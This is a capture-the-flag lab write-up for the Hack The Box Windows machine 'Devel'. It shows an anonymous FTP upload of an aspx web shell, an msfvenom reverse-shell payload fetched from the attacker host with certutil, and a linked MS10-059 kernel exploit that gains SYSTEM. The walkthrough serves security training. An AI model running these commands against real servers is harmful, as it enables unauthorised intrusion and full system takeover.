---
title: "HTB Devel"
permalink: /writeups/devel
location: default
---

# HTB Devel

**Machine Information**

	IP : 10.10.10.5
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.10.5 -- -sC -sV
```

This should reveal two open ports: `21` and `80`.

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 05-11-24  09:58AM                 1442 cmdasp.aspx
| 05-11-24  09:56AM                   13 hello.txt
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Getting a Foothold

**Upload a Web Shell**

We are able to connect to the FTP server as an anonymous user.

```
ftp 10.10.10.5
```

Looking at the files it looks like we are accessing the directory for an IIS web server.

```
ftp> ls
229 Entering Extended Passive Mode (|||49157|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

This can be confirmed by uploading a text file and seeing if we can access it.

```
put hello.txt
```

<http://10.10.10.5/hello.txt>

Success!

```
Hello there
```

Since it is an IIS server we need to upload an `aspx` web shell. One should be included with Kali Linux.

```
locate cmdasp.aspx
```

Copy this file to a current directory and upload it to the FTP server.

```
put cmdasp.aspx
```

Go to the following endpoint to access the web shell.

<http://10.10.10.5/cmdasp.aspx>

**Upload a Reverse Shell**

Use `msfvenom` to create a reverse shell payload.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe > shelly.exe
```

Upload the payload using the web shell.

```
mkdir C:\temp
certutil -urlcache -f http://10.10.14.4/shelly.exe C:\temp\shelly.exe
```

Start a new `netcat` listener and run the exploit to get a reverse shell.

```
C:\temp\shelly.exe
```

Success!

```
c:\windows\system32\inetsrv>whoami
iis apppool\web
```

### Privilege Escalation

Running `systeminfo` showed no patches have been installed which means it is likely vulnerable to multiple exploits. I used `Chimichurri.exe` as it was used on a previous machine and worked. It can be retrieved from the following link:

<https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe>

After the exploit has been uploaded create a new `netcat` listener and run the exploit.

```
.\MS10-059.exe 10.10.14.4 9001
```

Success!

```
C:\temp>whoami
nt authority\system
```

The user flag can be retrieved from the following directory:

```
C:\Users\babis\Desktop\user.txt
```

The root flag can be retrieved from the following directory:

```
C:\Users\Administrator\Desktop\root.txt
```
